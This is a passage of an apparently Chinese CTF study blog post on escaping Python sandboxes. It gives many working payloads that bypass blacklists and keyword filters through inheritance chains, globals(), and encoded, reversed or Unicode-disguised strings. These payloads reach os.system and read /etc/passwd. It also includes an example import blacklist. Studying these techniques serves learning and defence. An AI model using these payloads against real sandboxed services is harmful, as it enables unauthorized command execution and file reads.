class="string">&#x27;WIFSIGNALED&#x27;</span></span></span><br></pre></td></tr></table></figure>

<p>由于 import 导入模块时会检查 sys.modules 中是否已经有这个类，如果有则不加载,没有则加载.因此我们只需要将 os 模块删除,然后再次导入即可.</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">sys.modules[<span class="string">&#x27;os&#x27;</span>] = <span class="string">&#x27;not allowed&#x27;</span> <span class="comment"># oj 为你加的</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">del</span> sys.modules[<span class="string">&#x27;os&#x27;</span>]</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line">os.system(<span class="string">&#x27;ls&#x27;</span>)</span><br></pre></td></tr></table></figure>





<h5 id="基于继承链获取"><a href="#基于继承链获取" class="headerlink" title="基于继承链获取"></a>基于继承链获取</h5><p>(ssti)</p>
<p>在清空了<code>__builtins__</code>的情况下，我们也可以通过索引<code>subclasses</code>来找到这些内建函数。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">().__class__.__base__.__subclasses__()[5]</span><br></pre></td></tr></table></figure>

<h5 id="使用globals-获取builtins方法"><a href="#使用globals-获取builtins方法" class="headerlink" title="使用globals()获取builtins方法"></a>使用globals()获取builtins方法</h5><p>在一些题目中，可能通过覆盖内置的函数来限制我们使用。例如下面的代码：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">blacklist_fun_callback</span>(<span class="params">*args</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Player! It&#x27;s already banned!&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">vars</span> = blacklist_fun_callback</span><br><span class="line">attr = blacklist_fun_callback</span><br><span class="line"><span class="built_in">dir</span> = blacklist_fun_callback</span><br><span class="line"><span class="built_in">getattr</span> = blacklist_fun_callback</span><br><span class="line"><span class="built_in">exec</span> = blacklist_fun_callback</span><br><span class="line"><span class="built_in">__import__</span> = blacklist_fun_callback</span><br><span class="line"><span class="built_in">compile</span> = blacklist_fun_callback</span><br><span class="line"><span class="built_in">breakpoint</span> = blacklist_fun_callback</span><br></pre></td></tr></table></figure>

<p>但builtins 模块是一个不可变的模块对象，这样修改仅能够在当前的作用域中生效，而 globals() 中存放了 builtins 模块的索引，因此可以通过下面的方式获取到原始的方法。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">globals</span>()[<span class="string">&quot;__builtins__&quot;</span>][<span class="string">&#x27;breakpoint&#x27;</span>]</span><br></pre></td></tr></table></figure>

<p>但如果题目如下方式删除，那么就没有办法了，</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">del</span> <span class="built_in">globals</span>()[<span class="string">&quot;__builtins__&quot;</span>].<span class="built_in">breakpoint</span></span><br></pre></td></tr></table></figure>

<h4 id="绕过基于字符串匹配的过滤"><a href="#绕过基于字符串匹配的过滤" class="headerlink" title="绕过基于字符串匹配的过滤"></a>绕过基于字符串匹配的过滤</h4><h5 id="过滤关键字"><a href="#过滤关键字" class="headerlink" title="过滤关键字"></a>过滤关键字</h5><p>类似于ssti的过滤方法，<strong>注意看下面的过滤引号那里的比如<code>bytes()函数</code>等，注意知识点串通利用</strong></p>
<h6 id="字符串拼接"><a href="#字符串拼接" class="headerlink" title="字符串拼接"></a>字符串拼接</h6><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;</span>.__class__.__mro__[<span class="number">2</span>].__subclasses__()[<span class="number">59</span>].__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;file&#x27;</span>](<span class="string">&#x27;E:/passwd&#x27;</span>).read()</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;</span>.__class__.__mro__[<span class="number">2</span>].__subclasses__()[<span class="number">59</span>].__init__.__globals__[<span class="string">&#x27;__buil&#x27;</span>+<span class="string">&#x27;tins__&#x27;</span>][<span class="string">&#x27;fi&#x27;</span>+<span class="string">&#x27;le&#x27;</span>](<span class="string">&#x27;E:/passwd&#x27;</span>).read()</span><br></pre></td></tr></table></figure>

<h6 id="逆序"><a href="#逆序" class="headerlink" title="逆序"></a>逆序</h6><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">eval</span>(<span class="string">&#x27;)&quot;imaohw&quot;(metsys.)&quot;so&quot;(__tropmi__&#x27;</span>[::-<span class="number">1</span>])-这个<span class="built_in">exec</span>同样适用</span><br><span class="line"></span><br><span class="line"><span class="built_in">exec</span>(<span class="string">&#x27;)&quot;imaohw&quot;(metsys.so ;so tropmi&#x27;</span>[::-<span class="number">1</span>])</span><br></pre></td></tr></table></figure>

<p>注意 exec 与 eval 在执行上有所差异,其实就是多条命令执行的差异注意使用就行。</p>
<p>可以让解释器帮忙逆序再传进去：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">code= <span class="string">&quot;import os; system(ls)&quot;</span></span><br><span class="line"><span class="built_in">print</span>(code[::-<span class="number">1</span>])</span><br></pre></td></tr></table></figure>

<h6 id="编码"><a href="#编码" class="headerlink" title="编码"></a>编码</h6><p><strong>base64</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> base64</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>base64.b64encode(<span class="string">&#x27;__import__&#x27;</span>)</span><br><span class="line"><span class="string">&#x27;X19pbXBvcnRfXw==&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>base64.b64encode(<span class="string">&#x27;os&#x27;</span>)</span><br><span class="line"><span class="string">&#x27;b3M=&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>__builtins__.__dict__[<span class="string">&#x27;X19pbXBvcnRfXw==&#x27;</span>.decode(<span class="string">&#x27;base64&#x27;</span>)](<span class="string">&#x27;b3M=&#x27;</span>.decode(<span class="string">&#x27;base64&#x27;</span>)).system(<span class="string">&#x27;calc&#x27;</span>)</span><br><span class="line"><span class="number">0</span></span><br></pre></td></tr></table></figure>

<p><strong>八进制编码</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">exec</span>(<span class="string">&quot;__import__(&#x27;os&#x27;).system(&#x27;ls&#x27;)&quot;</span>)</span><br><span class="line"><span class="built_in">exec</span>(<span class="string">&quot;\137\137\151\155\160\157\162\164\137\137\50\47\157\163\47\51\56\163\171\163\164\145\155\50\47\154\163\47\51&quot;</span>)</span><br></pre></td></tr></table></figure>

<p><strong>十六进制编码</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">exec</span>(<span class="string">&quot;\x5f\x5f\x69\x6d\x70\x6f\x72\x74\x5f\x5f\x28\x27\x6f\x73\x27\x29\x2e\x73\x79\x73\x74\x65\x6d\x28\x27\x6c\x73\x27\x29&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>其他应该可以去看ssti的编码绕过，rot13、base32 等</p>
<h5 id="过滤了属性名或者函数名"><a href="#过滤了属性名或者函数名" class="headerlink" title="过滤了属性名或者函数名"></a>过滤了属性名或者函数名</h5><p>在payload的构造中，京城使用了各种类中的属性，例如<code>__class__</code>、<code>__import__</code>等。</p>
<h6 id="getattr函数"><a href="#getattr函数" class="headerlink" title="getattr函数"></a>getattr函数</h6><p><code>getattr</code>是Python的内置函数，用于获取一个对象的属性或者方法。其语法如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">getattr(object, name[, default])</span><br></pre></td></tr></table></figure>

<p>其中的object是对象，name是字符串，代表要获取的属性的名称。如果提供了 default 参数，当属性不存在时会返回这个值，否则会抛出 AttributeError。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">getattr</span>(&#123;&#125;,<span class="string">&#x27;__class__&#x27;</span>)</span><br><span class="line">&lt;<span class="keyword">class</span> <span class="string">&#x27;dict&#x27;</span>&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">getattr</span>(os,<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">&lt;built-<span class="keyword">in</span> function system&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">getattr</span>(os,<span class="string">&#x27;system&#x27;</span>)(<span class="string">&#x27;cat /etc/passwd&#x27;</span>)</span><br><span class="line">root:x:<span class="number">0</span>:<span class="number">0</span>:root:/root:/usr/<span class="built_in">bin</span>/zsh</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">getattr</span>(os,<span class="string">&#x27;system111&#x27;</span>,os.system)(<span class="string">&#x27;cat /etc/passwd&#x27;</span>)</span><br><span class="line">root:x:<span class="number">0</span>:<span class="number">0</span>:root:/root:/usr/<span class="built_in">bin</span>/zsh</span><br><span class="line"></span><br><span class="line">同样可用于继承链：</span><br><span class="line"><span class="built_in">getattr</span>(().__class__.__mro__[<span class="number">1</span>],<span class="built_in">chr</span>(<span class="number">95</span>)+<span class="built_in">chr</span>(<span class="number">95</span>)+<span class="built_in">chr</span>(<span class="number">115</span>)+<span class="built_in">chr</span>(<span class="number">117</span>)+<span class="built_in">chr</span>(<span class="number">98</span>)+<span class="built_in">chr</span>(<span class="number">99</span>)+<span class="built_in">chr</span>(<span class="number">108</span>)+<span class="built_in">chr</span>(<span class="number">97</span>)+<span class="built_in">chr</span>(<span class="number">115</span>)+<span class="built_in">chr</span>(<span class="number">115</span>)+<span class="built_in">chr</span>(<span class="number">101</span>)+<span class="built_in">chr</span>(<span class="number">115</span>)+<span class="built_in">chr</span>(<span class="number">95</span>)+<span class="built_in">chr</span>(<span class="number">95</span>))()</span><br></pre></td></tr></table></figure>

<h6 id="getattribute-函数"><a href="#getattribute-函数" class="headerlink" title="__getattribute__ 函数"></a><code>__getattribute__</code> 函数</h6><p>这个函数定义了当我们尝试获取一个对象的属性时应该进行的操作。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>os.__getattribute__</span><br><span class="line">&lt;method-wrapper <span class="string">&#x27;__getattribute__&#x27;</span> of module <span class="built_in">object</span> at <span class="number">0x7f06a9bf44f0</span>&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>os.__getattribute__(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">&lt;built-<span class="keyword">in</span> function system&gt;</span><br><span class="line"></span><br><span class="line">个人感觉这个在沙箱逃逸这里的局限性挺大的，也就只有过滤函数和一些属性值（ssti方面）的时候能用</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="built_in">eval</span>(<span class="string">&quot;os.__getattribute__(&#x27;system&#x27;)(&#x27;dir&#x27;)&quot;</span>)  这里再联想到字符串拼接来可以绕过system被过滤</span><br></pre></td></tr></table></figure>

<h6 id="getattr-函数"><a href="#getattr-函数" class="headerlink" title="__getattr__函数"></a><code>__getattr__</code>函数</h6><p><code>__getattr__</code>是Python的一个特殊方法，当尝试访问一个对象的不存在的属性时，它就会被调用。它允许一个对象动态地返回一个属性值，或者抛出一个<code>AttributeError</code>异常</p>
<p>如下是 <code>__getattr__</code> 方法的基本形式：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">MyClass</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__getattr__</span>(<span class="params">self, name</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;You tried to get &#x27;</span> + name</span><br></pre></td></tr></table></figure>

<p>在这个例子中，任何你尝试访问的不存在的属性都会返回一个字符串，形如 “You tried to get X”，其中 X 是你尝试访问的属性名。</p>
<p>与<code>__getattribute__</code>不同，<code>__getattr__</code>只有在属性查找失败时才会被调用，这使得<code>__getattribute__</code>可以用来更为全面地控制属性访问</p>
<p>如果在一个类中同时定义了 <code>__getattr__</code> 和 <code>__getattribute__</code>，那么无论属性是否存在，<code>__getattribute__</code> 都会被首先调用。只有当 <code>__getattribute__</code> 抛出 <code>AttributeError</code> 异常时，<code>__getattr__</code> 才会被调用。</p>
<p>另外，所有的类都会有<code>__getattribute__</code>属性，而不一定有<code>__getattr__</code>属性。</p>
<h6 id="属性值替换"><a href="#属性值替换" class="headerlink" title="属性值替换"></a>属性值替换</h6><p>正如ssti那里说过的，</p>
<p><code>__globals__</code> 可以用 func_globals 直接替换；</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;</span>.__class__.__mro__[<span class="number">2</span>].__subclasses__()[<span class="number">59</span>].__init__.__globals__</span><br><span class="line"><span class="string">&#x27;&#x27;</span>.__class__.__mro__[<span class="number">2</span>].__subclasses__()[<span class="number">59</span>].__init__.func_globals</span><br><span class="line"><span class="string">&#x27;&#x27;</span>.__class__.__mro__[<span class="number">2</span>].__subclasses__()[<span class="number">59</span>].__init__.__getattribute__(<span class="string">&quot;__glo&quot;</span>+<span class="string">&quot;bals__&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>同样<code>__mro__</code>、<code>__bases__</code>、<code>__base__</code>互换</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">[].__class__.__mro__[<span class="number">1</span>]</span><br><span class="line">[].__class__.__mro__[-<span class="number">1</span>]</span><br><span class="line">[].__class__.__bases__[<span class="number">0</span>]</span><br><span class="line">[].__class__.__base__</span><br></pre></td></tr></table></figure>



<h6 id="过滤import"><a href="#过滤import" class="headerlink" title="过滤import"></a>过滤import</h6><p><code>__loader__.load_module</code></p>
<p> <code>__loader__.load_module</code> 底层实现与 import 不同, <strong>因此某些情况</strong>下可以绕过。并且有一个缺点就是无法导入非内建模块</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&gt;&gt;&gt; __loader__.load_module(&#x27;os&#x27;)</span><br><span class="line">&lt;module &#x27;os&#x27; (built-in)&gt;</span><br></pre></td></tr></table></figure>



<h6 id="过滤引号"><a href="#过滤引号" class="headerlink" title="过滤引号"></a>过滤引号</h6><p>应该也可以用于过滤关键字这里的几个函数有些也能用于关键词过滤，注意知识点串联。</p>
<p><strong>str函数</strong></p>
<p>如果过滤了引号，我们 payload 中构造的字符串会受到影响。其中一种方法是使用 str() 函数获取字符串，然后索引到预期的字符。将所有的字符连接起来就可以得到最终的字符串。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>().__class__.__new__</span><br><span class="line">&lt;built-<span class="keyword">in</span> method __new__ of <span class="built_in">type</span> <span class="built_in">object</span> at <span class="number">0x9597e0</span>&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">str</span>(().__class__.__new__)</span><br><span class="line"><span class="string">&#x27;&lt;built-in method __new__ of type object at 0x9597e0&gt;&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">str</span>(().__class__.__new__)[<span class="number">21</span>]</span><br><span class="line"><span class="string">&#x27;w&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">str</span>(().__class__.__new__)[<span class="number">21</span>]+<span class="built_in">str</span>(().__class__.__new__)[<span class="number">13</span>]+<span class="built_in">str</span>(().__class__.__new__)[<span class="number">14</span>]+<span class="built_in">str</span>(().__class__.__new__)[<span class="number">40</span>]+<span class="built_in">str</span>(().__class__.__new__)[<span class="number">10</span>]+<span class="built_in">str</span>(().__class__.__new__)[<span class="number">3</span>]</span><br><span class="line"><span class="string">&#x27;whoami&#x27;</span></span><br></pre></td></tr></table></figure>

<p><strong>chr函数</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">chr(47)+chr(101)+chr(116)+chr(99) ==》/etc</span><br></pre></td></tr></table></figure>

<p><u>对应ascii表</u></p>
<p><strong>list+dict 构造任意字符串</strong></p>
<p>使用dict和list进行配合可以将变量名转化为字符串，但这种方式的<u>弊端</u>在于字符串中不能有空格等。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">list(dict(whoami=1))[0] ==》 whoami</span><br></pre></td></tr></table></figure>

<p><strong><code>__doc__</code></strong></p>
<p><code>__doc__</code>变量可以获取到类的说明信息，从其中索引处想要的字符串然后进行拼接就可以得到字符串：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">print(eval(&quot;().__doc__.find(&#x27;l&#x27;)&quot;)) ==》3</span><br><span class="line">print(eval(&quot;().__doc__.find(&#x27;s&#x27;)&quot;)) ==》19</span><br><span class="line"></span><br><span class="line">().__doc__[3]+().__doc__[19] ==》ls</span><br></pre></td></tr></table></figure>

<p><strong>bytes函数</strong></p>
<p>bytes函数可以接收一个ascii列表，然后转换为二进制字符串，再调用decode则可以得到字符串</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>([<span class="number">108</span>,<span class="number">115</span>]).decode()) ==&gt;ls</span><br></pre></td></tr></table></figure>

<h6 id="过滤"><a href="#过滤" class="headerlink" title="过滤 +"></a>过滤 +</h6><p>过滤了 + 号主要影响到了构造字符串，构造字符串还可以使用 join 函数</p>
<p>例如想要得到字符串 system ，可以用</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;</span>.join([<span class="string">&#x27;s&#x27;</span>, <span class="string">&#x27;y&#x27;</span>, <span class="string">&#x27;s&#x27;</span>, <span class="string">&#x27;t&#x27;</span>, <span class="string">&#x27;e&#x27;</span>, <span class="string">&#x27;m&#x27;</span>])</span><br><span class="line"></span><br><span class="line">join函数语法：<span class="string">&#x27;sep&#x27;</span>.join(seq) ，这里的sep代表分隔符，再这个例子中的<span class="string">&#x27;&#x27;</span>应该是代表没有分隔符，如果是<span class="string">&#x27;-&#x27;</span>，那么结果为s-y-s-t-e-m</span><br></pre></td></tr></table></figure>

<p>假如题目过滤了引号和加号,这里可以使用到 str() 这个函数来进行同样的操作（应该就是代表是字符串），初始的字符串可以通过 str() 进行获取.具体的字符串内容可以从 <code>__doc__</code> 中取，上面这个又可以写成下面这种形式：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">str</span>().join([().__doc__[<span class="number">19</span>],().__doc__[<span class="number">23</span>]])</span><br></pre></td></tr></table></figure>



<h6 id="过滤了数字"><a href="#过滤了数字" class="headerlink" title="过滤了数字"></a>过滤了数字</h6><p>如果过滤了数字的话，可以使用一些函数的返回值获取。例如： <u>0</u>：<code>int(bool([]))</code>、<code>Flase</code>、<code>len([])</code>、<code>any(())</code> <u>1</u>：<code>int(bool([&quot;&quot;]))</code>、<code>True</code>、<code>all(())</code>、<code>int(list(list(dict(a၁=())).pop()).pop())</code></p>
<p>有了 0 之后，其他的数字可以通过运算进行获取：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="number">0</span> ** <span class="number">0</span> == <span class="number">1</span></span><br><span class="line"><span class="number">1</span> + <span class="number">1</span> == <span class="number">2</span></span><br><span class="line"><span class="number">2</span> + <span class="number">1</span> == <span class="number">3</span></span><br><span class="line"><span class="number">2</span> ** <span class="number">2</span> == <span class="number">4</span></span><br></pre></td></tr></table></figure>

<p>当然也可以直接通过 repr 获取一些比较长字符串，然后使用 len 获取大整数。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">len</span>(<span class="built_in">repr</span>(<span class="literal">True</span>))</span><br><span class="line"><span class="number">4</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">len</span>(<span class="built_in">repr</span>(<span class="built_in">bytearray</span>))</span><br><span class="line"><span class="number">19</span></span><br><span class="line"></span><br><span class="line">对于这个字符串还是有点讲究的，最好不用这个</span><br></pre></td></tr></table></figure>

<p>第三种方法，可以使用 len + dict + list 来构造,这种方式可以避免运算符的的出现</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="number">0</span> -&gt; <span class="built_in">len</span>([])</span><br><span class="line"><span class="number">2</span> -&gt; <span class="built_in">len</span>(<span class="built_in">list</span>(<span class="built_in">dict</span>(aa=()))[<span class="built_in">len</span>([])])</span><br><span class="line"><span class="number">3</span> -&gt; <span class="built_in">len</span>(<span class="built_in">list</span>(<span class="built_in">dict</span>(aaa=()))[<span class="built_in">len</span>([])])</span><br></pre></td></tr></table></figure>

<p>第四种方法: unicode,可以使用ord来获取字符的ascii，再进行加减，如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># f = 102 = 333-231 = ord(&#x27;ō&#x27;)-ord(&#x27;ç&#x27;)</span></span><br><span class="line"><span class="comment"># l = 108 = 333-225 = ord(&#x27;ō&#x27;)-ord(&#x27;á&#x27;)</span></span><br><span class="line"><span class="comment"># a = 97 = 333-236 = ord(&#x27;ō&#x27;)-ord(&#x27;ì&#x27;)</span></span><br><span class="line"><span class="comment"># g = 103 = 333-230 = ord(&#x27;ō&#x27;)-ord(&#x27;æ&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">open</span>(<span class="built_in">bytes</span>([<span class="built_in">ord</span>(<span class="string">&#x27;ō&#x27;</span>)-<span class="built_in">ord</span>(<span class="string">&#x27;ç&#x27;</span>),<span class="built_in">ord</span>(<span class="string">&#x27;ō&#x27;</span>)-<span class="built_in">ord</span>(<span class="string">&#x27;á&#x27;</span>),<span class="built_in">ord</span>(<span class="string">&#x27;ō&#x27;</span>)-<span class="built_in">ord</span>(<span class="string">&#x27;ì&#x27;</span>),<span class="built_in">ord</span>(<span class="string">&#x27;ō&#x27;</span>)-<span class="built_in">ord</span>(<span class="string">&#x27;æ&#x27;</span>)])).read())</span><br></pre></td></tr></table></figure>



<h6 id="unicode绕过"><a href="#unicode绕过" class="headerlink" title="unicode绕过"></a>unicode绕过</h6><p><strong>Python3开始</strong>支持非ascii字符的标识符，也就是说，<strong>可以使用unicode字符作为Python的变量名、函数名</strong>等。Python 在解析代码时，使用的 Unicode Normalization Form KC (NFKC) 规范化算法，这种算法可以将一些视觉上相似的 Unicode 字符统一为一个标准形式。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&gt;&gt;&gt; eval == 𝘦val</span><br></pre></td></tr></table></figure>

<p>下面是 0-9,a-z 的 unicode 字符</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">𝟎𝟏𝟐𝟑𝟒𝟓𝟔𝟕𝟖𝟗</span><br><span class="line">𝘢𝘣𝘤𝘥𝘦𝘧𝘨𝘩𝘪𝘫𝘬𝘭𝘮𝘯𝘰𝘱𝘲𝘳𝘴𝘵𝘶𝘷𝘸𝘹𝘺𝘻 </span><br><span class="line">𝘈𝘉𝘊𝘋𝘌𝘍𝘎𝘏𝘐𝘑𝘒𝘔𝘕𝘖𝘗𝘘𝘙𝘚𝘛𝘜𝘝𝘞𝘟𝘠𝘡 </span><br></pre></td></tr></table></figure>

<p>下划线可以使用对应的全角字符进行替换：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">＿</span><br></pre></td></tr></table></figure>

<p>使用时注意第一个字符不能为全角，否则会报错：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">print</span>(_＿name_＿)</span><br><span class="line">__main__</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">print</span>(＿＿name_＿)</span><br><span class="line">  File <span class="string">&quot;&lt;stdin&gt;&quot;</span>, line <span class="number">1</span></span><br><span class="line">    <span class="built_in">print</span>(＿＿name_＿)</span><br><span class="line">          ^</span><br><span class="line">SyntaxError: invalid character <span class="string">&#x27;＿&#x27;</span> (U+FF3F)</span><br></pre></td></tr></table></figure>

<p><strong>需要注意的是，某些 unicode 在遇到 lower() 函数时也会发生变换，因此碰到 lower()、upper() 这样的函数时要格外注意。</strong></p>
<h6 id="过滤-1"><a href="#过滤-1" class="headerlink" title="过滤[]"></a>过滤[]</h6><p>同ssti，可用</p>
<p>1.<code>__getitem__()</code>函数替换</p>
<p>2.使用<code>pop()</code>函数</p>
<h4 id="绕过命名空间限制"><a href="#绕过命名空间限制" class="headerlink" title="绕过命名空间限制"></a>绕过命名空间限制</h4><h5 id="部分限制"><a href="#部分限制" class="headerlink" title="部分限制"></a>部分限制</h5><p>有些沙箱在构建时使用exec来执行目录，exec函数的第二个参数可以指定命名空间，通过修改。删除命名空间中的函数则可以构建一个沙箱。例子来源于 iscc_2016_pycalc。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">_hook_import_</span>(<span class="params">name, *args, **kwargs</span>):</span><br><span class="line">    module_blacklist = [<span class="string">&#x27;os&#x27;</span>, <span class="string">&#x27;sys&#x27;</span>, <span class="string">&#x27;time&#x27;</span>, <span class="string">&#x27;bdb&#x27;</span>, <span class="string">&#x27;bsddb&#x27;</span>, <span class="string">&#x27;cgi&#x27;</span>,</span><br><span class="line">                        <span class="string">&#x27;CGIHTTPServer&#x27;</span>, <span class="string">&#x27;cgitb&#x27;</span>, <span class="string">&#x27;compileall&#x27;</span>, <span class="string">&#x27;ctypes&#x27;</span>, <span class="string">&#x27;dircache&#x27;</span>,</span><br><span class="line">                        <span class="string">&#x27;doctest&#x27;</span>, <span class="string">&#x27;dumbdbm&#x27;</span>, <span class="string">&#x27;filecmp&#x27;</span>, <span class="string">&#x27;fileinput&#x27;</span>, <span class="string">&#x27;ftplib&#x27;</span>, <span class="string">&#x27;gzip&#x27;</span>,</span><br><span class="line">                        <span class="string">&#x27;getopt&#x27;</span>, <span class="string">&#x27;getpass&#x27;</span>, <span class="string">&#x27;gettext&#x27;</span>, <span class="string">&#x27;httplib&#x27;</span>, <span class="string">&#x27;importlib&#x27;</span>, <span class="string">&#x27;imputil&#x27;</span>,</span><br><span class="line">                        <span class="string">&#x27;linecache&#x27;</span>, <span class="string">&#x27;macpath&#x27;</span>, <span class="string">&#x27;mailbox&#x27;</span>, <span class="string">&#x27;mailcap&#x27;</span>, <span class="string">&#x27;mhlib&#x27;</span>, <span class="string">&#x27;mimetools&#x27;</span>,</span><br><span class="line">                        <span class="string">&#x27;mimetypes&#x27;</span>, <span class="string">&#x27;modulefinder&#x27;</span>, <span class="string">&#x27;multiprocessing&#x27;</span>, <span class="string">&#x27;netrc&#x27;</span>, <span class="string">&#x27;new&#x27;</span>,</span><br><span class="line">                        <span class="string">&#x27;optparse&#x27;</span>, <span class="string">&#x27;pdb&#x27;</span>, <span class="string">&#x27;pipes&#x27;</span>, <span class="string">&#x27;pkgutil&#x27;</span>, <span class="string">&#x27;platform&#x27;</span>, <span class="string">&#x27;popen2&#x27;</span>, <span class="string">&#x27;poplib&#x27;</span>,</span><br><span class="line">                        <span class="string">&#x27;posix&#x27;</span>, <span class="string">&#x27;posixfile&#x27;</span>, <span class="string">&#x27;profile&#x27;</span>, <span class="string">&#x27;pstats&#x27;</span>, <span class="string">&#x27;pty&#x27;</span>, <span class="string">&#x27;py_compile&#x27;</span>,</span><br><span class="line">                        <span class="string">&#x27;pyclbr&#x27;</span>, <span class="string">&#x27;pydoc&#x27;</span>, <span class="string">&#x27;rexec&#x27;</span>, <span class="string">&#x27;runpy&#x27;</span>, <span class="string">&#x27;shlex&#x27;</span>, <span class="string">&#x27;shutil&#x27;</span>, <span class="string">&#x27;SimpleHTTPServer&#x27;</span>,</span><br><span class="line">                        <span class="string">&#x27;SimpleXMLRPCServer&#x27;</span>, <span class="string">&#x27;site&#x27;</span>, <span class="string">&#x27;smtpd&#x27;</span>, <span class="string">&#x27;socket&#x27;</span>, <span class="string">&#x27;SocketServer&#x27;</span>,</span><br><span class="line">                        <span class="string">&#x27;subprocess&#x27;</span>, <span class="string">&#x27;sysconfig&#x27;</span>, <span class="string">&#x27;tabnanny&#x27;</span>, <span class="string">&#x27;tarfile&#x27;</span>, <span class="string">&#x27;telnetlib&#x27;</span>,</span><br><span class="line">                        <span class="string">&#x27;tempfile&#x27;</span>, <span class="string">&#x27;Tix&#x27;</span>, <span class="string">&#x27;trace&#x27;</span>, <span class="string">&#x27;turtle&#x27;</span>, <span class="string">&#x27;urllib&#x27;</span>, <span class="string">&#x27;urllib2&#x27;</span>,</span><br><span class="line">                        <span class="string">&#x27;user&#x27;</span>, <span class="string">&#x27;uu&#x27;</span>, <span class="string">&#x27;webbrowser&#x27;</span>, <span class="string">&#x27;whichdb&#x27;</span>, <span class="string">&#x27;zipfile&#x27;</span>, <span class="string">&#x27;zipimport&#x27;</span>]</span><br><span class="line">    <span class="keyword">for</span> forbid <span class="keyword">in</span> module_blacklist:</span><br><span class="line">        <span class="keyword">if</span> name == forbid:        <span class="comment"># don&#x27;t let user import these modules</span></span><br><span class="line">            <span class="keyword">raise</span> RuntimeError(<span class="string">&#x27;No you can\&#x27; import &#123;0&#125;!!!&#x27;</span>.<span class="built_in">format</span>(forbid))</span><br><span class="line">    <span class="comment"># normal modules can be imported</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">__import__</span>(name, *args, **kwargs)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sandbox_exec</span>(<span class="params">command</span>):      <span class="comment"># sandbox user input</span></span><br><span class="line">    result = <span class="number">0</span></span><br><span class="line">    __sandboxed_builtins__ = <span class="built_in">dict</span>(__builtins__.__dict__)</span><br><span class="line">    __sandboxed_builtins__[<span class="string">&#x27;__import__&#x27;</span>] = _hook_import_    <span class="comment"># hook import</span></span><br><span class="line">    <span class="keyword">del</span> 